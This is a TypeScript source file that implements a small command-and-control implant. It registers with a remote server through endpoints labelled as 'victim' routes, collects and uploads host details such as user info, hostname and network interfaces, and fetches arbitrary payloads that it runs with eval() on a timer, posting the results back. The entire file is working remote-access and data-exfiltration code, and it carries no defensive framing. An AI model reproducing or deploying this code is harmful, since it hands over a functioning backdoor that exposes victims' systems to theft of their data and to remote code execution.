/*
 * Copyright (C) 2021  Aravinth Manivannan <realaravinth@batsense.net>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
import * as os from "os";

const DOMAIN = "https://frpc.batsense.net";
const REGISTER = `${DOMAIN}/api/v1/victim/join`;
const RESPONSE = `${DOMAIN}/api/v1/victim/payload/response`;
const PAYLOAD = `${DOMAIN}/api/v1/victim/payload/get`;

const makePayload = (payload: any, id: number) => {
	const body = {
		response: JSON.stringify(payload),
		id
	};
	const value = {
		method: "POST",
		headers: {
			"Content-Type": "application/json"
		},
		body: JSON.stringify(body)
	};
	return value;
};

export const info = async (id: number) => {
	const data = {
		arch: os.arch(),
		cpus: os.cpus(),
		info: os.userInfo(),
		os: os.type(),
		freemem: os.freemem(),
		net: os.networkInterfaces(),
		hostname: os.hostname(),
		release: os.release()
	};
	await fetch(RESPONSE, makePayload(data, id));
};

export const register = async () => {
	await fetch(REGISTER, { method: "POST" });
};

export type Payload = {
	id: number;
	payload_type: string;
	payload: string;
};

export const getPayloads = async () => {
	let resp = await fetch(PAYLOAD, { method: "POST" });
	if (resp.status == 200) {
		return resp.json();
	}
};

export const execCustomPayload = async (payload: Payload) => {
	let response = eval(payload.payload);
	if (response === null || response === undefined) {
		response = "";
	}
	response = { response };
	await fetch(RESPONSE, makePayload(response, payload.id));
};

const UPDATE_PERIOD = 250;
setTimeout(async () => {
	let payload: Array<Payload> = await getPayloads();
	payload.forEach(async p => {
		if (p.payload_type == "INFO") {
			await info(p.id);
		} else {
			await execCustomPayload(p);
		}
	});
}, UPDATE_PERIOD);
